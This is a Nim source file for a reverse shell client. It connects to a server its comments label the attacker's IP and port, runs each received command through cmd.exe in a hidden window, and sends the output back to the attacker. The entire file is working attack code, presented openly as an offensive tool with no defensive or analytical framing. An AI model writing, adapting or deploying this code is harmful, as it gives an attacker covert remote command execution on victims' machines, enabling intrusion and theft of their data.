# TCP client in Nim
# - Connects to a server IP and port
# - Receives messages from server
# - Executes commands and sends output back to server
# - Disconnects if received message is "exit"

import net
import strutils
import osproc, streams

const
  SERVER_IP = "127.0.0.1"   # Attackers IP address
  SERVER_PORT = Port(5000)   # Attackers port

var
  client = newSocket()

echo "Connecting to ", SERVER_IP, ":", SERVER_PORT

client.connect(SERVER_IP, SERVER_PORT)

echo "Connected to server"

while true:
  try:
    # Receive command/message from server (attacker)
    let msg = client.recvLine()
    if msg.strip().toLowerAscii() == "":
        continue # skip if message is empty

    let cmd = msg

    # Exit only if message is "exit"
    if msg.strip().toLowerAscii() == "exit":
      echo "Exit message received"
      client.close()
      break

    # start command line and execute command
    let p = startProcess(
    "cmd.exe",
    args = ["/c", cmd],
        options = {
            poUsePath,
            poStdErrToStdOut,
            poDaemon # hidden window
        }
    )

    # Read output in real time
    let stream = outputStream(p)

    while running(p) or not stream.atEnd():
        if not stream.atEnd():
            let line = stream.readLine()
            echo line # print to console
            client.send(line) # send it to attacker
    # Wait for process to finish
    let exitCode = waitForExit(p)

    echo "\nExit code: ", exitCode # print exit code to console

    close(p) # close command line process

  except:
    echo "Connection error"
    break